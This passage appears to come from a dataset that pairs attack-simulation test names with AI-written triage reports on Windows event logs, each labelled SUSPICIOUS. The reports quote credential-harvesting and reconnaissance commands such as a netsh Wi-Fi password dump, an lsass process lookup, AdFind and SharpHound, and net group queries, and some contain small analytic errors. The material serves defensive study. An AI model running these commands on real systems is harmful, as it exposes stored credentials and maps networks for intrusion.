   - **Execution of `cmd.exe` running a command with `AdFind.exe`:** The `AdFind.exe` is used by attackers for reconnaissance. The presence within a non-standard directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\\Externalfiles`) is unusual.
   - **Microsoft Edge Updates and Installation:** Several entries about Edge installation/update processes managed by system-level services hint at legitimate software maintenance tasks.
   - **Execution of `whoami.exe` and `HOSTNAME.EXE`:** These utilities are for checking user and computer info, respectively. While not uncommon in administrative scripts, combined with other behaviors, may warrant attention.
   
5. **Security Log**:
   - Repeated Event ID 5379, indicating credential validation failures. These may or may not correlate with potent threats but indicate failed operations possibly due to incorrect credentials or permissions.

### Assessment and Guidance:
- **Suspicious Activity:**
   - Use of `AdFind.exe` through `cmd.exe`, especially in temporary directories.
   - Curious use of `wevtutil.exe` by the administrative user.
   - The failed credential validation events could suggest brute force attempts or similar activities.

Given the above points, these logs display indicators that could align with non-standard or potentially harmful behavior.

### Recommended Action:
- **Resolution: SUSPICIOUS**
   - Investigate the context and necessity of executed tools (`AdFind.exe`, `PowerShell`, `wevtutil.exe`). Correlate their usage with corresponding legitimate administrative tasks, if any.
   - Check the legitimacy of user `admin_test` actions. Ensure this account is not compromised.
   - Review Windows Defender and system logs for any alerts or additional suspicious behavior around the times of the events documented.
   - Examine affected systems for any signs of unauthorized changes or data exfiltration.

Proceed with enhanced monitoring and possibly controlled isolation of the machine to prevent any potential spread of compromise until further clarity is achieved."
Enumerate Default Domain Admin Details (Domain),"Upon reviewing the provided event logs, here's a detailed analysis on any suspicious or anomalous activities present:

### Security Log
- **EventID 4672 (Special privileges assigned to new logon):** The user `admin_test` was logged in as a privileged account with a comprehensive set of administrative privileges, which include `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc. This can indicate potential for privilege escalation or administrative tasks, but given the username implies it might be a test account, this needs further justification for its purpose.
- **EventID 4624 (An account was successfully logged on):** The `admin_test` user made a network logon (LogonType 3) using NTLM from a device with the IP `fe80::e3b5:5371:12a8:9c77`. While NTLM over networks isn't a best practice due to security reasons, it's not inherently malicious without further context.

### Sysmon Log
- **EventID 1 (Process Create):** The same `admin_test` user executed a sequence of processes:
  - Usage of `wevtutil.exe` multiple times without accompanying details might indicate log tampering efforts to clear or export logs. 
  - Execution of `whoami.exe`, `HOSTNAME.EXE`, and network utilities like `cmd.exe /c net user administrator /domain`, `net.exe`, `net1.exe`, suggests reconnaissance activities to gather user and network information. This is worth investigating further.
- **EdgeUpdate Process Activities:** Several instances of Microsoft EdgeUpdate processes are logged, with different command lines used, indicating an update or installation activity. These processes run with ""NT AUTHORITY\SYSTEM"" privileges and appear to be legitimate software update activities:

### Overall Assessment
- The actions executed by `admin_test`, particularly the querying of `administrator /domain` via command line, accompanied with administrative privilege assignments, are concerning for potential lateral movement or privilege escalation.
- The repetition of administrative-level access, especially from what appears to be a testing user account, can warrant a deeper review to confirm legitimacy, especially since no supporting evidence (like authorized changes or IT tickets) accompany it.

### Resolution
Based on the analysis:
- **Resolution:** **SUSPICIOUS**

### Guidance for Follow-up
1. **Verification:** Confirm the legitimacy of the `admin_test` account's activities. This includes understanding its intended use, querying relevant account logs, and ensuring the account wasn't misused.
2. **Reach out to IT/Network Team:** Collaborate to determine if the observed activities were part of any scheduled or authorized scripts, testing, or maintenance.
3. **Review Network Logs:** Investigate any network activity associated with the user's session to identify any unauthorized data exfiltration or lateral movement attempts.
4. **Security Enhancements:** Consider implementing additional security controls such as disabling NTLM, monitoring for abnormal user behaviors more aggressively, and ensuring privileged operations are logged with full justifications and approvals.

Closing the investigation on a positive confirmation from IT or senior administrators would be crucial, otherwise, escalating for deeper cybersecurity review is recommended."
System Network Configuration Discovery (TrickBot Style),"Upon analyzing the provided logs, several points of interest and potential concerns have been identified. Here's a detailed breakdown:

### Security Logs:
1. **Repeated Event ID 5379:** There are multiple failed attempts to read credentials (`EventID 5379`) with a consistent `ReturnCode` of `3221226021`, indicating an access violation. This could suggest an application or script repeatedly trying to access credentials improperly, potentially signaling a misconfiguration or a brute force attempt.

2. **Privilege Assignments (Event ID 4672):** Multiple instances of privileged logons and assignments are recorded. The presence of `SeDebugPrivilege` and several other high-privilege tokens assigned to `SYSTEM` and `admin_test` users should be carefully reviewed for legitimacy. Although `SYSTEM` often holds elevated privileges, the presence of the `admin_test` account performing similar actions should be flagged for verification.

3. **Event ID 4624 (Logon event):** The logon type `3` for the `admin_test` account suggests a network logon, which is typically benign. However, in conjunction with other elevated privileges and potential unauthorized attempts to read credentials, this requires further confirmation.

### Sysmon Logs:
1. **Execution of EdgeInstallers and Updates:** The Sysmon logs show Microsoft Edge updates/installers running with system privileges. The command line executions look consistent with legitimate Edge update processes, and no anomalies such as odd paths or non-standard parameters were found.

2. **Commands Executed by `cmd.exe`:** The execution of a command pipeline involving `ipconfig`, `net config`, and `nltest` seems like a typical information gathering script, possibly for network diagnostics. However, given other activities, confirm that these executions align with expected administrative tasks.

3. **`whoami` and `hostname` executed by `admin_test`:** These actions to ascertain user identity and system information could be legitimate administrative activity, but their occurrence alongside other elevated interactions should be verified against normal usage patterns for the `admin_test` account.

4. **Multiple Uses of `wevtutil` and `conhost`:** Although these are common utility executions, their frequent invocation, especially by `admin_test`, might hint at log manipulation or observation for unauthorized activity. These should be reviewed for intent and authorization.

### Other Logs:
- There is no direct indication from the Application and System logs of issues, as entries largely pertain to standard updates and system operations.

### Assessment:
- The confluence of high-privilege activities, failed credential accesses, and certain login activities put the logs in the **SUSPICIOUS** category. The `admin_test` account's activities should particularly be scrutinized for legitimacy and necessity.

### Guidance:
1. **Verify Credential Failures:** Investigate the repeated failed credential read attempts to determine the involved process or script and rectify if unauthorized.
   
2. **Confirm Account Legitimacy:** Verify the legitimacy and necessity for privileges associated with the `admin_test` account.

3. **Monitor Privileged Logons:** Conduct more rigorous logging or enable alerts for privileged account accesses and assignments.

4. **Routine Review:** Cross-reference command line executions with expected administrative workflows to identify potential deviations or unauthorized actions.

The resolution of this analysis is **SUSPICIOUS** due to activities that appear inconsistent with typical administrative behavior and warrant detailed follow-up."
Launch DirLister Executable,"Upon analyzing the provided logs, several points need to be addressed:

### Detailed Analysis:
- **PowerShell Activity**: There is PowerShell activity with the execution of a script that starts another process: `DirLister.exe`. This executable is located within the `C:\Users\ADMIN_~1\AppData\Local\Temp\Externalfiles\` folder. 
  - PowerShell is a powerful scripting tool and is often used legitimately for administration tasks; however, it can also be leveraged by attackers for malicious purposes. The use of `Start-Process`, `Start-Sleep`, and `Stop-Process` in PowerShell scripts could be a scripting technique to run and then immediately terminate a process after execution, which might aim at executing a transient or malicious payload.

- **Sysmon Logs**: The Sysmon logs reflect the creation of processes related to the execution of PowerShell and `DirLister.exe`, where `DirLister.exe` is executed with an elevated integrity level. Elevated privileges could indicate potential misuse, especially since it is run from a temporary directory—a location often used by malware to reside or execute.
  - The `DirLister.exe` further runs without any parent process details suggestive of creation by a script or downloaded content.
  - Other Sysmon logs show high numbers of instances of Microsoft Edge Update and other system processes such as `wevtutil.exe` and `conhost.exe`. While these are legitimate system processes, their frequency in relation to the timeline can be a point of further investigation.

- **Anomalies and Concerns**:
  - *Temporary Path Execution*: The execution of binaries from temporary paths.
  - *Regular Stopping of Edge Update Services*: Edge service regularly stopping could either be an update process or another reason. It can be benign but warrants looking into if connected with the PowerShell activities closely due to concurrent timings.
  - *Lack of Correlation in Sysmon for Parent-Child Relationships*: Some process executions show no parent process, these detached events can indicate process hollowing or rogue activities.

### Final Assessment:
The PowerShell activity and the execution of `DirLister.exe` with elevated privileges are particularly unconventional and can be an indicator of a more nuanced context that might have been overlooked. Its placement in a temporary directory adds to these concerns.

### Resolution:
- **SUSPICIOUS** - The activities observed are unusual and could be consistent with patterns used in adversary techniques. Given the lack of detail on what `DirLister.exe` actually does and the usage of PowerShell to launch it, additional investigation is warranted. This should include:
  - File integrity checks on `DirLister.exe` and other suspicious executables.
  - An analysis of network traffic associated with `DirLister.exe` execution.
  - Validation of whether the PowerShell script and components are part of an authoritatively known and permitted administrative task or application update process.

### Guidance:
- Conduct root-cause analysis on the `DirLister.exe` to understand its actions on the system.
- Utilize antivirus/malware analysis tools to scan for known threats within this executable and similar ones within the context.
- Gather related user activity logs around the execution time to parcel out whether this follows from expected behavior or settings.
- Reconcile these findings with network and architectural baselines to conclude security posture or require containment steps."
Azure Security Scan with SkyArk,"Upon reviewing the provided event logs, the following points of interest were noted:

1. **PowerShell Activity:**
   - The logs show that a PowerShell script, `AzureStealth.ps1`, was imported and executed with a command line that indicates the use of Azure-related cmdlets. The script seems to utilize hardcoded credentials (via `ConvertTo-SecureString` with the string `""dataAz""`) to connect to Azure services (`Connect-AzAccount` and `Connect-AzureAD`), followed by scanning Azure administrators with the `Scan-AzureAdmins` cmdlet. This behavior is unusual and could suggest credential misuse or unauthorized account activities related to Azure tenancy.
   - The use of paths like `""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles""` suggests potential obfuscation or attempts to evade detection, which can be a red flag for malicious intent.

2. **Security Logs:**
   - Privileges like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others were assigned to the user `admin_test` (Event ID 4672), which are high-level privileges typically not needed for regular user accounts and could indicate potential misuse for unauthorized access or privilege escalation.
   - There's a logon session record (Event ID 4624) indicating the use of NTLM authentication from an external IP `192.168.0.102`, which should be investigated for legitimacy as it could indicate lateral movement or unauthorized access.

3. **Sysmon Logs:**
   - Processes associated with PowerShell (`powershell.exe`) and others like `csc.exe`, `cvtres.exe`, which are part of the C# compiler toolchain, executed under `SERVER002\admin_test`. This behavior suggests possible attempts to compile or execute .NET code, potentially linked with the imported PowerShell script.
   - Frequent creation of `conhost.exe` instances and the use of `wevtutil.exe` may indicate attempts to manipulate event logs, which is consistent with cover-up activity following an intrusion.

**Assessment:**
The logs contain several indicators of potentially malicious behavior. The use of hardcoded credentials in PowerShell, unauthorized privilege acquisition, and script execution with Azure-related commandlets without clear rationale point towards suspicious and possibly malicious use of administrative access.

**Resolution: SUSPICIOUS**
The activities noted are suspicious and warrant a deeper investigation to ascertain whether they pose a security threat or were conducted with legitimate purposes by authorized personnel.

**Next Steps:**
- Conduct a thorough investigation of the `admin_test` account activities and any recent changes to its permissions.
- Verify the legitimacy of the external IP (`192.168.0.102`) and its access to the server.
- Examine the purpose and source of the `AzureStealth.ps1` script, and identify any unauthorized Azure resources access.
- Review system configurations and ensure logging for detailed monitoring of PowerShell executions for anomalies.
- Consider involving network defense and Azure teams to evaluate system integrity and potential exposure."
System Discovery - SocGholish whoami,"## Detailed Log Analysis

### **Security Logs:**
The Security log entries (EventID 5379) indicate Credential Validation failures related to MicrosoftAccount and WindowsLive tokens on Server002. The ReturnCode `3221226021` usually signifies a security package error, which might occur due to incorrect credentials or some mishandling in token validation. Multiple entries from the same `ClientProcessId` and `ProcessCreationTime` suggest repeated failed attempts to retrieve or validate credentials.

**Assessment:**
While these failed credential validation events are not inherently indicative of malicious activity, repeated failed attempts to access tokens could suggest either a configuration issue or a potential prelude to credential-based attacks. However, without successful logins or usage of these credentials, malicious intent is not confirmed.

### **Sysmon Logs:**
1. **Process Creation Events:**
   - Instances of `wevtutil.exe` and `conhost.exe` processes initiated under the user `SERVER002\admin_test`. `wevtutil.exe` is a legitimate Windows utility used to query and manage event logs, but its repeated usage warrants further investigation to determine if it is intentional or part of a malicious scenario.
   - `whoami.exe` and `hostname.exe` executions are recorded, mainly for system information and verification of user identity on the host.

2. **PowerShell Execution:**
   - Additional suspicious behavior is recorded involving PowerShell. The commanding line involves generating random file names and utilizing `whoami.exe` output. This pattern of obfuscated script and creating files in `Temp` suggests potential unauthorized behavior or data exfiltration attempts.

3. **MU_Usage:**
   - Legitimate updates through `wuauclt.exe`, `AM_Delta.exe`, and `MpSigStub.exe`, suggesting routine security updates by Windows Defender – consistent with normal operations.

**Assessment:**
The presence of `wevtutil.exe`, and PowerShell commands with obfuscation tactics (unusual for regular user operations and indicative of script-based attacks) suggest suspicious activity. The repeated usage of PowerShell to create random-named files and dump `whoami.exe` output appears peculiar and requires further inspection for any script-based attacks.

### **Windows PowerShell Logs:**
PowerShell logs confirm the execution of a scripted command during the same timeframe noted in the Sysmon logs. The code involves manipulation of string arrays, random generation of alphanumeric sequences, and performing `whoami.exe /all`, generally indicative of an attempt to gather user credentials or system configuration under high-level integrity.

**Assessment:**
Given the obfuscation tactics used within PowerShell commands, this reflects potential scripting abuse towards reconnaissance or data collection.

### **System Logs:**
System logs reflect routine updates executed by the Windows Update Client. These logs coincide with the Antivirus updates and match the timeline suggesting scheduled updates causing no immediate concerns.

## Final Assessment and Resolution:

Based on the analysis:
- **Suspicious activity** related to the repeated failed credential access attempts and the potentially abusive use of PowerShell for random file generation and system information retrieval.
- The usage of native Windows utilities (`wevtutil.exe`, `PowerShell`, `whoami.exe`) in a manner that is not typical for a standard user environment supports the need for further investigation.

**Resolution:** **SUSPICIOUS**
- Further investigation is warranted to determine the origin and intent of the PowerShell commands, verify any unauthorized access attempts, and perform endpoint detection to ensure no malicious payloads or scripts were executed successfully. Consider performing a threat-hunting exercise targeting PowerShell and script-based activities on the network."
Discover Specific Process - tasklist,"### Detailed Analysis of Provided Logs:

**1. Process Execution Analysis (Sysmon Events):**
- The logs contain several instances of processes like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `tasklist.exe`, and `findstr.exe` being executed by the user `SERVER002\\admin_test`.
- **Wevtutil.exe**: Interactions with this process can be normal if done for administrative tasks related to Windows event logs. However, it can also be used maliciously for clearing logs.
- **Whoami.exe and Hostname.exe**: Used to get system and user information; often executed for system configuration checks, but can be used in information gathering by attackers.
- **Cmd.exe with command `tasklist | findstr lsass`**: This indicates looking for the process `lsass` which can be a precursor to suspicious activity, as `lsass` is often targeted to extract credentials. This behavior is usually indicative of reconnaissance or preparatory steps for credential theft.
- **Other process executions (`tasklist.exe`, `findstr.exe`)** appear to relate to the command executed with `cmd.exe`.

**2. System and Security Logs:**
- **Time Changes (Security & System Events)**: The logs indicate time being changed (`EventID: 4616`) via `svchost.exe` from `2024-10-22 19:25:00` to `2024-10-22 19:24:50`. Frequent or unauthorized time adjustments can be a sign of attempts to hide tracks or adjust system timings for scheduled tasks or event log manipulations.
- **Security Audit Events**: No abnormal user account activities like failed logins or privilege escalation attempts are recorded.

**3. Application Logs:**
- The application log contains an entry by the Software Protection Platform (SPP), which is standard for licensing checks and appears benign.

**4. Indicators of Potential Malicious Activity:**
- The combination of accessing `lsass` process details and executing system utilities (like `whoami.exe`, `tasklist.exe`) could suggest preparatory actions for credential theft or elevated access, which are common techniques used in lateral movement or privilege escalation.
- The recurrence of wevtutil.exe executions could suggest potential log clearing attempts, though more context is needed (e.g., parameter details which are missing here).

### Assessment:
- **SUSPICIOUS**: The process execution orders and the specific commands used (searching for `lsass`) coupled with time changes on the system indicate behavior atypical of normal user operations. Without further context (e.g., sanctioned administrative tasks or security tool checks), this warrants deeper investigation into the commands executed, motivations, and user intentions. Checking if the time changes were authorized and determining the necessity of the `lsass` process targeting is crucial to assess potential risks.

### Guidance and Next Steps:
- **Further Investigation**: 
  - Review recent user actions and administrative activities for `SERVER002\\admin_test` to ascertain legitimacy of such commands.
  - Check for related network logs or alerts from endpoint security solutions for any lateral movement or exploitation attempts.
  - Monitor for additional suspicious activities, especially around sensitive processes like `lsass`.
  
- **Precautionary Actions**:
  - If deemed unauthorized, consider resetting credentials for `SERVER002\\admin_test`.
  - Ensure logging facilities are adequately protected against unauthorized access or clearance.

The analysis concludes with a **SUSPICIOUS** resolution, recommending immediate further investigation and enhanced monitoring."
SharpHound3 - LocalAdmin,"## Detailed Analysis of the Logs

### Observations

1. **Security Log Entries:**
   - **Event ID 4624**: This indicates a successful logon, specifically of type 5, which is related to a service logon. The target user is SYSTEM, which is a legitimate activity typically used by Windows services.
   - **Event ID 4672**: Special privileges assigned, indicating high level permissions to the SYSTEM account. This is expected for system processes and may not necessarily be abnormal.

2. **Sysmon Log Entries:**
   - **Processes Executed by 'admin_test' User**:
     - `powershell.exe`: A PowerShell session was executed with a specific command involving ""SharpHound.exe"". SharpHound is known for collecting Active Directory information, often used as part of penetration testing or Red Team activities (e.g., BloodHound).
     - Multiple instances of `wevtutil.exe`, `conhost.exe`, and typical system utilities like `whoami.exe`.
   - The `admin_test` user executing these commands in quick succession (e.g., SharpHound) is unusual, especially since these types of tools are typically used in auditing or adversarial operations.

3. **Windows PowerShell Log Entries:**
   - The execution of a PowerShell script involving the use of SharpHound was observed (`EventID 600`). The command was constructing a temporary directory and launching SharpHound.exe with potential lateral movement or reconnaissance intent. The sequence aligns with activities often observed in penetration testing or unauthorized security assessment contexts.

### Assessment:

- **Suspicious Nature**: The presence and execution of SharpHound.exe, a tool associated with Active Directory reconnaissance and often utilized in Red Team operations, clearly raises red flags regarding its legitimacy in this context. It functions to gather various forms of data from an Active Directory environment, which could be leveraged for malicious purposes if found in an environment without prior known pen-testing activities.
- **Activity Context**: Without prior confirmation of authorized pen-test activities or security assessments being scheduled or conducted, such activity can be indicative of potential compromise or an insider threat if illegitimately run.

### Final Resolution: **SUSPICIOUS**

The activity, particularly the use of SharpHound, suggests potential reconnaissance efforts, either authorized (but unlogged) or unauthorized. A thorough investigation and verification with IT/security teams are needed to establish whether these actions were permissible as part of planned security measures or audit activities.

### Guidance on How to Proceed

1. **Immediate Actions**:
   - Verify with IT and Security teams whether there was an authorized pen-test or security audit at this time.
   - If unauthorized, escalate the findings to incident response for a more in-depth investigation.
   - Review the accounts and permissions of the `admin_test` user for any abnormal changes or breaches of access policies.

2. **Monitoring and Analysis**:
   - Monitor and log PowerShell activities more closely, setting up alerts for known pen-testing or hacking tools.
   - Employ additional security tools to track abnormal behavior patterns, such as unusual data access or communication with unknown or external servers.

3. **Long-term Measures**:
   - Enhance user awareness training to recognize the signs of unauthorized activities.
   - Regularly audit user activities, especially those with administrator privileges, to prevent insider threat instances."
Enumerate Stored Wi-Fi Profiles And Passwords via netsh,"**Analysis of Windows Event Logs**

Upon reviewing the provided log entries across several categories, certain activities catch the eye for requiring deeper scrutiny:

1. **Time Change Events (Event ID 4616):** There are two `4616` Security Log events indicating a system time change by `svchost.exe` which operates under `LOCAL SERVICE` context. Rapid and unauthorized changes to the system time can sometimes indicate malicious activity aimed at altering log integrity or forensic timelines. Though these logs alone do not confirm malicious intent, it's something that merits closer inspection.

2. **Privileged Logons and Privilege Use (Event IDs 4624 and 4672):** Several events depict a user `admin_test` logging in to `Server002`. The logon type is `3`, which generally indicates a network logon. Furthermore, the user is granted several high-level privileges including `SeDebugPrivilege`, which is often exploited in attacks as it allows a user to debug other processes – a capability often sought by malicious actors.

3. **Command Execution (Sysmon Event ID 1 and 5):**
   - `cmd.exe` is executing the command `netsh wlan show profile * key=clear`, using high integrity levels. This activity is typically used to retrieve configuration data for wireless profiles, including plaintext passwords. Such behavior is strongly indicative of credential harvesting attempts.
   - Utilization of utility processes like `wevtutil.exe`, `conhost.exe`, and `whoami.exe` in sequence within short time frames, while more common in administrative operations, can be leveraged suspiciously in the context of lateral movements or reconnaissance.

4. **Failed Credential Access (Event ID 5379):** Several events depict attempts to access a `MicrosoftAccount:user` credential which returned a failure status. This might be indicating unauthorized or unsuccessful attempts to retrieve credential information.

5. **Windows Update and Anti-Malware Operations (Sysmon and System logs):** A detection of `wuauclt.exe` executing within normal parameters, followed by `MpSigStub.exe`, indicate routine Windows update checks and anti-malware definition updates. Operations appear benign and are likely legitimate system processes for maintaining system security.

**Conclusion and Recommendations**

- **Resolution: SUSPICIOUS**
  
  The logs reflect a mix of benign and suspicious activities. Particularly, the time change events and unusual uses of administrative tools with high privileges raise concerns. The command-line activity used to expose potentially sensitive information stands out as particularly suspect.

**Guidance on How to Proceed:**
1. **Indicator Investigation**: Delve deeper into specific events, especially those involving `admin_test`, to verify whether this activity was sanctioned or part of routine administrative tasks. Validate if this user should possess high-level privileges and access.

2. **User Activity Audit**: Perform a comprehensive audit and verification of account `admin_test` actions to ascertain legitimacy, checking against known legitimate administrative operational profiles.

3. **Enhanced Monitoring**: Set heightened monitoring and alerting for the use of critical system commands and script executions. Focus on commands used in credential access and data retrieval from network configurations.

4. **Incident Response**: If unauthorized actions are confirmed, initiate the incident response protocol. Focus on containment, identification of affected assets, and mitigation procedures to protect sensitive information and restore system integrity.

Log files suggest activity that merits immediate investigation to confirm or negate malicious intent. Prompt measures should ensure risks are mitigated swiftly."
Security Software Discovery - Sysmon Service,"Upon reviewing the provided Windows event logs, several key observations can be made to assess whether there is any indication of malicious activity.

### Key Observations:

1. **Windows Time Service (W32Time) Adjustments:**
   - The security and system logs (EventID 4616 and EventID 1 respectively) indicate frequent and rapid changes to the system time by the process `svchost.exe`. However, adjusting system time by itself isn't usually a red flag unless it is paired with malicious intent such as bypassing security logs. 

2. **Unusual Process Execution:**
   - The `sysmon` logs show multiple processes being executed by a user account `SERVER002\\admin_test`. While `admin_test` indicates an administrative account which might be expected to run such operations, the context of the command line usage, specifically processes like PowerShell, cmd.exe with command lines such as `""cmd.exe"" /c fltmc.exe | findstr.exe 385201` can often be indicative of script-based attacks or attempts to identify and manipulate system filters and processes.
   - Execution of `fltmc.exe`, `findstr.exe`, and frequent `wevtutil.exe` usage suggest potential enumeration or log management activities often used post-compromise.

3. **Administrative Script Execution:**
   - The use of `whoami.exe` and `hostname.exe` executed with high integrity levels, followed by the commands initiated by `cmd.exe` prompt, indicate attempts to confirm user credentials and system environment details which can be precursor activities by an unauthorized user attempting to pivot or escalate privileges.

4. **Microsoft Edge Updates:**
   - The logs indicate consistent use of legitimate Microsoft Edge executables for updates with associated services, processes executed under `NT AUTHORITY\SYSTEM`. This appears to be legitimate behavior for regular updates, but the context of these repeated executions should be validated against the known update schedule or user activity logs.

### Assessment:

- The logs contain several elements that require further inspection. The frequency and utilization of administrative commands under the context of a local admin account, combined with system time changes and log management tools, suggest that there could be underlying unauthorized or unintended script activity.
- Without further context, these actions are unusual but not definitively malicious on their own. This warrants a classification of **SUSPICIOUS**, necessitating additional investigation to confirm or dismiss potential compromise.

### Recommended Actions:

1. **Further Investigation:**
   - Conduct a thorough log analysis, particularly on the usage patterns of `wevtutil.exe`, `fltmc.exe`, and any scripts associated with `admin_test`.
   - Correlate these findings with any unrelated logs, scheduled tasks, user accounts activity, and network traffic patterns to rule out false positives.

2. **Monitor System Time Changes:**
   - Review any other logs that can indicate why frequent time adjustments were needed and ensure that they align with expected server operations or updates. Consider potential repercussions on log integrity that such changes might induce.

3. **Validate Software Update Activities:**
   - Confirm the legitimacy of Microsoft Edge Update activities against update schedules or with relevant system update reports.

4. **Conduct Threat Hunting:**
   - Initiate threat hunting procedures to rule out latent threats or unnoticed breaches in other parts of the environment, especially focusing on the components interacting with the administrative services and network.

5. **Access Controls and Anomaly Detection:**
   - Verify access controls for user accounts especially those alleged to be involved and upgrade anomaly detection algorithms to constantly monitor high-privilege account activities.

This classification of **SUSPICIOUS** indicates potential threats or risks that have not yet been determined but, through further investigation, could be clarified as benign or escalated as malicious."
Remote System Discovery - net group Domain Controller,"Upon analyzing the provided logs from various sources, here are the observations and findings:

### System Logs:
1. **Registry Hive Resizing (EventID: 15)**:
   - The event indicates resizing of a registry hive (`COMPONENTS`). This is a regular system activity and not inherently suspicious unless it correlates with other suspicious activities.

2. **Time Synchronization (EventID: 35)**:
   - Synchronization with `time.windows.com` is expected behavior for maintaining correct system time and is benign.

3. **Windows Update Events (EventID: 44, 43, 19)**:
   - These events are associated with Microsoft Defender Antivirus updates, which are standard and expected for keeping the system's security measures up to date.

### Sysmon Logs:
1. **Process Creation**:
   - The logs show routine process creation events for utilities like `whoami.exe`, `hostname.exe`, `cmd.exe`, `wevtutil.exe`, and `conhost.exe`. The use of `whoami` and `hostname` is typical in script execution or system checks.
   - The command `cmd.exe /c net group /domain ""Domain controllers""` was executed, which queries domain group membership. This could potentially be part of reconnaissance activity but needs context to decide malicious intent.

2. **Process Executions**:
   - Processes `wevtutil.exe` and `conhost.exe` were spawned multiple times. `wevtutil` is used for managing event logs and a spurious use might hint at log tampering, but no evidence supports malicious intent here based on available logs.
   - Use of `cmd.exe` with network-related commands can be benign or part of administrative tasks.

### Security Logs:
1. **EventID 5379**:
   - Multiple failed access attempts on `MicrosoftAccount` services were recorded. The `ReturnCode` of `3221226021` suggests a failed access attempt likely due to incorrect authentication. This pattern is not normal user behavior and could suggest someone probing for access.

### Application Logs:
1. **Security Product State**:
   - Windows Defender is reported as being active (`SECURITY_PRODUCT_STATE_ON`), which is positive from a security stance.

### Assessment:
- **Suspicious Activity**: 
  - The failed authentication attempts (`EventID 5379`) on Microsoft Account services could indicate probing or unauthorized access attempts. 
  - The network query `net group /domain ""Domain controllers""` is something an administrator might do, but paired with failed login attempts could be part of a reconnaissance phase by an attacker within a network.

### Conclusion:
- **Resolution: SUSPICIOUS**
  - Although many logs indicate typical system activity, the repeated failed credential access attempts and system/network commands point to unusual behavior that warrants further investigation. 

### Recommended Actions:
1. **Investigate Failed Access Attempts**: 
   - Determine if these logins are from known services or unexpected sources. Verify whether these attempts correlate with unusual account behavior.
   
2. **Review Network Commands**:
   - Verify the intent of the network-related commands executed. Check if `admin_test` user activities are regular or deviate from historical norms.

3. **Perform Threat Hunts**:
   - Conduct a deeper analysis into network traffic during these logs for lateral movements or additional failed authentic attempts.

4. **Update and Monitor Security Posture**:
   - Ensure all security patches are up-to-date and monitor logs for any further unusual activities. Consider enabling additional logging for detailed insights in potential attacks."
List Google Chrome - Opera Bookmarks on Windows with powershell,"Upon reviewing the provided logs, here is the detailed analysis:

### Sysmon Log Analysis:
1. **Process Execution Patterns:**
   - Most processes executed appear standard for a Windows environment (e.g., `svchost.exe`, `services.exe`, `wsmprovhost.exe`, `taskhostw.exe`). 
   - A command of interest is a PowerShell command: `powershell.exe & {Get-ChildItem -Path C:\Users\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force}`. On its own, this command seems to be enumerating files named ""Bookmarks,"" which may indicate someone looking for saved browsing data, raising privacy or data exfiltration flags. 
   - Usage of `whoami.exe`: This is a benign command that simply checks the current user context, but its repeated execution could suggest attempts to verify user privileges.

2. **Integrity Levels and User Context:**
   - High integrity levels are noted, which could be expected for administrative tasks, but they might also be exploited for privilege escalation by malicious actors. 
   - The processes are often executed by the `SERVER002\admin_test` user, which matches normal operations assuming this user is valid and expected to conduct administrative tasks.

3. **Unusual PowerShell Activity:**
   - The PowerShell command noted earlier could be seen as suspicious, particularly if unexpected or out of normal behavior for the environment. However, without context, it is not immediately malicious.

### Windows PowerShell Log:
The PowerShell logs corroborate the Sysmon event and show consistent use with the command: `Get-ChildItem`. This logs activity over the directory of `C:\Users\`, indicating possible directory enumeration possibly looking for specific types of files indicated by ""Bookmarks"". This could be used for data gathering; thus, this warrants further investigation to understand the intention or source of this execution.

### Security Log Analysis:
- **Security Events:**
  - The logs show successful logon sessions and privilege escalation with high-level privileges, such as `SeAssignPrimaryTokenPrivilege`. 
  - The security logs do not show unauthorized access attempts, but the regular elevation of privileges should be verified against expected user actions. Regular attempts to read specific credential information (evident in event ID 5379) might indicate credential harvesting attempts, though no success is indicated here.

### System Log and Application Log Analysis:
- **Time Sync Events:** 
  - Standard time synchronization events with `time.windows.com` are observed without irregularities.
- **Service Events:**
  - Regular service stops for `edgeupdate`, a component of Microsoft Edge, are noted without suspicious triggers.
- **Application Events:**
  - Nothing stands out as particularly suspicious from an application standpoint. 

### Conclusion:
- **Assessment:**
  Based on the information within the logs, there are activities that merit further investigation, such as the use of PowerShell for directory enumeration and the repeated checks of user permissions via `whoami.exe`. 

- **Resolution:**
  The resolution is **SUSPICIOUS**. The activity involving directory enumeration and checks of user permissions suggests potential malicious intent and requires further investigation, such as checking the source of these commands and the context in which they are being used."

2. **SecurityCenter**: Windows Defender is reported to be operational. Consistent state without any transitions to ""off"" or ""suspended"" modes, indicating presence of active defense layers.

3. **Microsoft-Windows-Security-SPP**: Software Protection Platform logs an entry, typical of routine licensing and software validity checks.

#### Security Log:
1. **Event ID 4624 (Logon)**: A system logon (type 5, signify service startup) using `SYSTEM` credentials by `services.exe`. This is routine and signifies typical system operations.
   
2. **Event ID 4672 (Special Privileges)**: `SYSTEM` received multiple high privilege rights, expected for system services requiring operational flexibility.

#### Sysmon Log:
1. **Process Executions:**
   - **cmd.exe & AdFind.exe Execution**: A command execution from `cmd.exe` with the path leading to `AdFind.exe`, a known Active Directory query tool. 
     - **Indicators of Risk**:
       - **Context**: `AdFind` frequently appears in both legitimate admin tasks and threat actors' reconnaissance and data gathering phases. 
       - **Command-Line Arguments**: The use of `AdFind` here suggests exploration of domain security policies, hinting at credential or policy reconnaissance.

2. **Microsoft Edge Updates and Related Processes**: Numerous processes related to Edge Update setup/registration seen executing, consistent with software update mechanisms. The correlation of these events related closely to the same interval may indicate standard update procedures rather than malicious activity due to the files aligning with known Microsoft products.

3. **Additional Processes**:
   - Multiple occurrences of **whoami.exe**, **hostname.exe**, and **conhost.exe** generally align with ordinary diagnostic commands and console operations following certain scripts.
   - **wevtutil.exe**: Microsoft Event Utility process instances seen executed frequently; commonly used for event log management, but extensive use without documented administrative tasks could raise flags.

### Assessment and Recommendation:
- **Suspicious Behavior**: The presence and use of `AdFind.exe` alongside typical system processes. While these processes themselves are not harmful, they can suggest reconnaissance, especially on systems containing sensitive Active Directory integrations.
  
- **Incident Resolution**: **SUSPICIOUS**

### Guidance:
- **Further Investigation**:
  - Review the source and intent of `AdFind` usage. Validate if initiated by authorized personnel or automated scripts.
  - Validate any subsequent logon activities or process creations around the timeline of `AdFind` to catch potential lateral movement.
  - Consider deploying advanced monitoring on services/utilities frequently used in scripts.
  
- **Recommendation**:
